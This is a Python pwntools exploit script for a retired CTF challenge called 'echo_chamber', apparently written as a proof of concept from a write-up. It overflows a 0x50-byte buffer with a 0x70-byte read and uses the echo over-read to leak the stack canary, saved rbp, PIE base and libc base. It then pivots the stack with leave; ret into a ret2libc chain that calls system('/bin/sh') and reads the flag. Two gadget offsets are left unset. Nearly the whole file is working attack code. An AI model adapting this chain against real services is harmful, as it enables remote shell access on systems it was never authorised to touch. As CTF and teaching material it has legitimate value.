#!/usr/bin/env python3
"""echo_chamber - Pwn (Hard): 0x70-byte read into a 0x50-byte buffer with a C-string
echo over-read; leaks canary/saved rbp/PIE/libc and pivots into a second-stage
ret2libc chain via leave; ret.

Usage: python3 echo_chamber.py <host> <port>            (remote)
       python3 echo_chamber.py local [./echo_chamber]   (local binary)

The CSCTF 2026 instance is retired; this PoC documents the exploit path.
"""
import sys
from pwn import *

context.arch = "amd64"

# Leak offsets from buf (0x70-byte read into a 0x50-byte buffer)
CANARY_OFF = 0x58
SAVED_RBP_OFF = 0x60
RET_ADDR_OFF = 0x68

# Gadgets / symbols (PIE base-relative), from the writeup
LEAVE_RET = 0x1365        # leave; ret
PRINTF_GADGET = 0x1332    # lea rax,[rbp-0x60]; mov rsi,rax; mov rdi,fmt; call printf
MAIN_RET = 0x137e         # return address into main+0x137e
# libc base-relative
LIBC_START_CALL_MAIN_RET = 0x29d90  # return address leaked by the printf gadget
POP_RDI_RET = 0x2a3e5               # pop rdi; ret
BINSH = 0x1d8678                    # "/bin/sh"
SYSTEM = 0x50d70                    # system

# TODO: supply gadget offsets not reproduced in the writeup
POP_RBP_RET = None   # pop rbp ; ret           (PIE + offset)
RET_ALIGN = None     # single ret for 16-byte stack alignment (libc + offset)


def recv_echo(p):
    p.recvuntil(b"echo: ")
    return p.recvuntil(b"\n")[:-1]


def main():
    if POP_RBP_RET is None or RET_ALIGN is None:
        raise SystemExit("TODO: set POP_RBP_RET and RET_ALIGN gadget offsets (see comments)")

    if len(sys.argv) >= 2 and sys.argv[1] == "local":
        binary = sys.argv[2] if len(sys.argv) > 2 else "./echo_chamber"
        p = process(binary)
    elif len(sys.argv) >= 2:
        host, _, port = sys.argv[1].partition(":")
        p = remote(host, int(port))
    else:
        raise SystemExit(__doc__)

    # --- Leak 1: canary + saved rbp (overwrite only the canary's NUL LSB)
    p.send(b"A" * 0x58 + b"B")
    data = recv_echo(p)
    canary = b"\x00" + data[0x59:0x60].ljust(7, b"\x00")
    saved_rbp = u64(data[0x60:0x68].ljust(8, b"\x00"))
    main_rbp = saved_rbp + 8
    buf = main_rbp - 0x70
    log.info("canary    = %s", hex(u64(canary)))
    log.info("main_rbp  = %s", hex(main_rbp))

    # --- Leak 2: PIE (fake canary + fake rbp, real return address untouched)
    p.send(b"A" * 0x58 + b"C" * 8 + b"D" * 8)
    data = recv_echo(p)
    ret_addr = u64(data[RET_ADDR_OFF:RET_ADDR_OFF + 8].ljust(8, b"\x00"))
    pie = ret_addr - MAIN_RET
    log.info("PIE base  = %s", hex(pie))

    # --- Stage 3: bye breaks the loop; leave; ret pivots into the chain below.
    # printf gadget leaks main's return address into __libc_start_call_main, then
    # falls through into read(0, main_rbp+8, 0x70) so the process survives.
    payload = b"bye".ljust(0x10, b"A")
    payload += p64(0xdeadbeef)              # popped into rbp by leave; unused
    payload += p64(pie + POP_RBP_RET)       # pop rbp ; ret
    payload += p64(main_rbp + 0x68)         # -> rbp (rbp-0x60 = main_rbp+8)
    payload += p64(pie + PRINTF_GADGET)     # leak + fall-through read
    payload += b"A" * (CANARY_OFF - len(payload))
    payload += p64(canary)
    payload += p64(buf + 0x10)              # saved rbp -> post-leave rsp
    payload += p64(pie + LEAVE_RET)
    assert len(payload) == 0x70
    p.send(payload)
    p.recvuntil(b"echo: ")
    data = p.recvuntil(b"\n")[:-1]
    libc_leak = u64(data[:8].ljust(8, b"\x00"))
    libc_base = libc_leak - LIBC_START_CALL_MAIN_RET
    log.info("libc base = %s", hex(libc_base))

    # --- Stage 4: second read lands at main_rbp+8; bye breaks the loop again;
    # canary check passes with [rbp-8]; two leave; ret pivots into the chain.
    payload = b"bye".ljust(0x10, b"A")
    payload += p64(libc_base + RET_ALIGN)   # stack alignment
    payload += p64(libc_base + POP_RDI_RET)
    payload += p64(libc_base + BINSH)
    payload += p64(libc_base + SYSTEM)
    payload += b"A" * (CANARY_OFF - len(payload))
    payload += p64(canary)
    payload += p64(main_rbp + 0x10)
    payload += p64(pie + LEAVE_RET)
    assert len(payload) == 0x70
    p.send(payload)

    p.sendline(b"cat /flag")
    p.interactive()


if __name__ == "__main__":
    main()
